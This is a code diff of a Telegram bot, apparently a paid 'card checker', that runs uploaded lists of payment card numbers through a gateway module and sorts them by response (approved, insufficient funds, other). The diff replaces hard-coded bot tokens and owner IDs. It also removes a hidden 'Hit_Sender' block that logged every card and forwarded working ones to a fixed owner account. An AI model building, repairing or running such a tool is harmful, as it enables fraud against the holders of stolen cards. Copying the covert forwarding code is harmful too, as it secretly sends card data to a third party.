@@ -3,17 +3,17 @@ import telebot,time
 from telebot import types
 from gatet import Tele
 import os
-token = '8493295121:AAExDmPOke7cofkeExXdkznqZ_Eyg9nCe4M'
+token = '8250463794:AAGl0rUujU79YGIR6khBZHhPGDrZ9F-Ar6s'
 bot=telebot.TeleBot(token,parse_mode="HTML")
 @bot.message_handler(commands=["start"])
 def start(message):
-	if not str(message.chat.id) == '7103090839':
+	if not str(message.chat.id) == '7954343626':
 		bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @strawhatchannel96")
 		return
 	bot.reply_to(message,"Send the file now")
 @bot.message_handler(content_types=["document"])
 def main(message):
-	if not str(message.chat.id) == '7103090839':
+	if not str(message.chat.id) == '7954343626':
 		bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @strawhatchannel96")
 		return
 	dd = 0
@@ -89,35 +89,6 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 
 𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} second</code> 
 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @strawhatchannel96'''
-
-#Hit_Sender
-				# Main Owner ID
-				owner_id = 7954343626  #
-
-				# Card ရလာဒ်ကို Case-insensitive ဖြင့် စစ်ဆေးမယ်
-				card_info = f"💳 Card: {cc.strip()} \n📝 Message: Response: {last}"
-
-				if "Thank" in last or "thank" in last or "THANK" in last:
-				    # "thank" "Thank" "THANK" ပါရင် thank_cards.txt ထဲ သိမ်း
-				    with open("thank_cards.txt", "a") as thank_file:
-				        thank_file.write(card_info + "\n")
-
- 				   # "thank" ပါတဲ့ ကဒ်တွေကို Main Owner ဆီသို့ ပို့
-				    bot.send_message(owner_id, f"✅ Thank Result Found:\n{card_info}")
-
-				elif "sufficient funds" in last.lower():
-				    # "insufficient funds" ပါရင် insufficient_cards.txt ထဲ သိမ်း
-				    with open("insufficient_cards.txt", "a") as insufficient_file:
- 				       insufficient_file.write(card_info + "\n")
-
-				    # "insufficient funds" ပါတဲ့ ကဒ်တွေကို Main Owner ဆီသို့ ပို့
-				    bot.send_message(owner_id, f"⚠️ Insufficient Funds Card:\n{card_info}")
-
-				else:
-				    # အခြား result များကို other_cards.txt ထဲ သိမ်း
-				    with open("other_cards.txt", "a") as other_file:
- 				       other_file.write(card_info + "\n")
-#Hit_Sender
 				
 				print(last)
 				if 'Thank' in last:
